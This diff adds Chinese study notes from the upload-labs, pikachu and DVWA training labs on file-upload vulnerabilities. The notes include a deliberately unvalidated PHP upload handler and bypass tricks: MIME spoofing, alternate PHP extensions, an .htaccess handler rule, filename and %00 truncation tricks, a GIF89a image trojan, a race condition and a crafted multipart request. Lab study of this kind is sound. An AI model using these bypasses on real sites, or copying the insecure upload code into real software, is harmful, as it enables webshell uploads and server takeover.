@@ -1,0 +1,190 @@
+文件上传：先用爆破的方式来试试这关是否是黑名单过滤。（判断黑白名单）
+靶场 pikachu dvwa upload-labs
+后端
+<?php 
+
+//接收来自对方的文件
+$fileinfo = $_FILES['wenjian'];
+
+//获得文件名
+//echo $_FILES['wenjian']['name'];
+
+//echo '<br/>';
+
+//查看文件信息
+print_r($fileinfo);
+
+//获得文件名
+$filename = $fileinfo["name"];
+
+//获得文件临时路径
+$filetmp_path = $fileinfo["tmp_name"];
+
+//把图片从临时路径挪到你要的地方
+move_uploaded_file($filetmp_path, "./pic/".$filename);
+
+?>
+
+
+前端：
+<form action="sc.php" method="POST" enctype="multipart/form-data">
+<label>文件名字：</label>
+<input type="file" name="wenjian" id="file" />
+<input type="submit" name="submit" value="提交">
+</form>
+
+
+白名单和黑名单
+
+文件上传漏洞
+
+文件上传功能在web应用系统很常见，比如很多网站注册的时候需要上传头像、上传附件等等。
+当用户点击上传按钮后，后台会对上传的文件进行判断 比如是否是指定的类型、后缀名、大小等等，然后将其按照设计的格式进行重命名后存储在指定的目录。 
+如果说后台对上传的文件没有进行任何的安全判断或者判断条件不够严谨，则攻击着可能会上传一些恶意的文件，比如一句话木马，从而导致后台服务器被 webshell。
+
+文件类型判断、文件MIME type、文件大小、文件包含和文件上传一起使用
+
+upload-labs
+https://www.fujieace.com/penetration-test/upload-labs-pass-01-20.html  up-labs详解
+有些绕过方法会导致传过去的不是php文件，php3可以使用
+1
+禁用js
+
+2
+MIME校验（拦截文件类型）
+修改Content-Type为image/jpeg
+
+3
+php3 php4 pht phtml都可以被当作php来执行
+上传haha.php3
+
+4
+打进去后，及时删除
+在apache中.htaccess文件的作用是把xxxx类型的东西当作xxxx来执行
+<FilesMatch "jpg">
+SetHandler application/x-httpd-php
+</FilesMatch>
+此时会把所有文件名包含jpg的文件当作php来执行
+上传haha.jpg
+
+5
+windows系统不区分大小写
+linux严格区分大小写
+haha.PHp
+
+6.
+如果没有判断首位去空
+Windows文件系统里面haha.php  =haha.php
+
+7
+windows系统haha.php.=haha.php
+
+8
+haha.php::$DATA=haha.php
+
+9
+haha.php. .=haha.php
+
+10
+haha.phphpp
+
+11
+get的%00截断，发现数据包存在文件存储的位置
+如果碰到%00，就会自动截断
+save_path=../upload/haha.php%00.jpg
+filename="haha.php.jpg"
+
+12
+post的%00截断
+post的数据包中，%00需要右键--convert selection--url---urldecode
+
+apache不会给%00进行自动解码
+
+13-15
+文件包含漏洞，include函数可以把包含的所有任意文件当作php来执行
+GIF89a
+<?php phpinfo()?>
+木马上传之后，利用文件包含漏洞执行
+http://127.0.0.1/include.php?file=./upload/4920220117144104.gif
+
+文件合并制作图片木马
+copy kfc1.jpg /b+ haha.php /a muma.jpg（ok）
+
+
+16-17
+先把文件移动到文件夹，再判断，那么说明文件有那么一瞬间肯定在，所以需要使用burp等软件进行快速提交，达到让它删不过来
+
+18
+.7z有时候也可以当作php执行
+
+19
+move_upload_file函数会忽略/.
+
+Content-Disposition: form-data; name="upload_file"; filename="haha.php"
+Content-Type: image/jpeg
+
+GIF89a
+<?php phpinfo()?>
+-----------------------------200222961522119
+Content-Disposition: form-data; name="save_name[0]"
+
+upload-20.php/
+-----------------------------200222961522119
+Content-Disposition: form-data; name="save_name[2]"
+
+jpg
+
+T20
+（代码审计）
+<?php
+
+//检查MIME
+$allow_type = array('image/jpeg','image/png','image/gif');
+if(!in_array($_FILES['upload_file']['type'],$allow_type)){
+    $msg = "禁止上传该类型文件!";
+}else{
+    //检查文件名
+    $file = empty($_POST['save_name']) ? $_FILES['upload_file']['name'] : $_POST['save_name'];
+    //$file数组0--upload-20.php/   1--null 2--jpg
+
+    //如果不是数组，用.来把$file变成数组，如果本来就是数组，跳过此步骤
+    if (!is_array($file)) {
+     //文件名小写，然后用.进行分割
+        $file = explode('.', strtolower($file));
+    }
+
+    //拿到了数组的最后一个数据
+    $ext = end($file);//jpg
+    $allow_suffix = array('jpg','png','gif');
+    if (!in_array($ext, $allow_suffix)) {
+        $msg = "禁止上传该后缀文件!";
+    }else{
+     //upload-20.php
+        $file_name = reset($file) . '.' . $file[count($file) - 1];
+        $temp_file = $_FILES['upload_file']['tmp_name'];
+        $img_path = UPLOAD_PATH . '/' .$file_name;
+        if (move_uploaded_file($temp_file, $img_path)) {
+            $msg = "文件上传成功！";
+            $is_upload = true;
+        } else {
+            $msg = "文件上传失败！";
+        }
+    }
+
+
+?>
+
+备注:
+$file = array(0=>'no1',2=>'no3' );
+$file数组中有2个元素
+$file[1]的结果是null
+
+$trim($a)  // 首尾去空
+strrchr($a,'.') //寻找.以及输出之后的东西
+strtolower($a); // 转为小写
+deldot($a) /
+
+
+
+
+
